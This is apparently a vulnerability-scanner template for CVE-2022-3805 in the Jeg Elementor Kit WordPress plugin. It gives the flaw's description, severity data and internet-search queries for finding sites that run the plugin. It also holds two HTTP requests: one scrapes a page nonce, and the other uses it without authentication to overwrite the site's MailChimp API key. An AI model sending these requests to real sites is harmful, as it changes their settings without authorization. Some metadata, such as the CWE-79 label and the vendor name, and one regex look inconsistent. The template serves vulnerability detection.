id: CVE-2022-3805

info:
  name: Jeg Elementor Kit < 2.5.7 - Unauthenticated Settings Update
  author: popcorn94
  severity: high
  description: |
    The Jeg Elementor Kit plugin for WordPress is vulnerable to authorization bypass in various functions used to update the plugin settings in versions up to, and including, 2.5.6. Unauthenticated users can use an easily available nonce, obtained from pages edited by the plugin, to update the MailChimp API key, global styles, 404 page settings, and enabled elements.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3805
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/jeg-elementor-kit/jeg-elementor-kit-256-unauthenticated-authorization-bypass
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L
    cvss-score: 8.6
    cve-id: CVE-2022-3805
    cwe-id: CWE-79
    epss-score: 0.00085
    epss-percentile: 0.25683
    cpe: cpe:2.3:a:jegtheme:jeg_elementor_kit:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: wpdesk
    product: jeg-elementor-kit
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/jeg-elementor-kit"
    fofa-query: body=/wp-content/plugins/jeg-elementor-kit/
    publicwww-query: /wp-content/plugins/jeg-elementor-kit/
  tags: cve,cve2022,wordpress,vkev
  
http:
  - raw:
      - |
       GET / HTTP/1.1 #use on the page you create your elementor page with Jeg Elementor Kit
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
       
      
    extractors:
          - type: regex  #retrieve the static nonce
            name: nonce
            regex:
              - ' jkit_nonce = "([a-zA-Z0-9]{10})'
            group: 1
            internal: true
          - type: regex  #retrieve jkit url
            name: url
            regex:
              - ' jkit_ajax_url = "^(http://|https://|http://www\.|https://www\.|www\.)?.+$'
            internal: true  
            
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        jkit-ajax-request=jkit_elements&form_data[mailchimp_api_key]=1234&action=save_user_data&nonce={{nonce}}
    
    matchers:
      - type: regex
        regex:
          - \"Success Save Data\"

            


        